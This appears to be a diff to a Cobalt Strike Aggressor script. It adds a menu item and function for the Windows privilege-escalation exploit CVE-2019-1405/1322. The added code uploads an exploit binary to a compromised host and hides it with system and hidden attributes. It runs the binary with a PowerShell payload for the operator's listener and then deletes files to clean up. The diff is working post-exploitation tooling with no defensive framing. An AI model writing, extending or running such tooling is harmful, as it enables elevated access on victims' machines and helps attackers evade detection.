@@ -81,6 +81,21 @@ sub ms16032{
     exec("cmd.exe /C del /F ".$fname);
 }
 
+
+sub CVE_2019_1405_1322{
+    local('$Rch $payload');
+    $Rch = "x64";
+    if (beacon_info($bid,"is64") != 1){
+        show_error("The target is not a x64 machine !");
+        return;
+    }
+    $payload = powershell($3['listener'], false, $Rch);
+    bupload($bid, script_resource("exp/com/1405_1322_x64.exe"));
+    bshell($bid, "attrib \"1405_1322_x64.exe\" +s +h");
+    bshell($bid,"1405_1322_x64.exe \"".$payload."\"");
+    bshell($bid,"del /F /S /Q /AH $Rch $+ .exe");
+}
+
 #append menus
 
 
@@ -112,6 +127,16 @@ sub ms16032{
             $bid = $1['@'];
             $Dialog = dialog("MS16-032",%(bid => $bid),&ms16032);
             dialog_description($Dialog, "The vulnerability could allow elevation of privilege if the Windows Secondary Logon Service fails to properly manage request handles in memory.");
+            drow_listener($Dialog, "listener", "Listener: ");
+            dbutton_action($Dialog, "Exploit");
+            dialog_show($Dialog);
+        }
+
+
+        item "CVE-2019-1405 && 1322"{
+            $bid = $1['@'];
+            $Dialog = dialog("CVE-2019-1405/1322",%(bid => $bid),&CVE_2019_1405_1322);
+            dialog_description($Dialog, "An elevation of privilege vulnerability exists when Windows improperly handles authentication requests");
             drow_listener($Dialog, "listener", "Listener: ");
             dbutton_action($Dialog, "Exploit");
             dialog_show($Dialog);
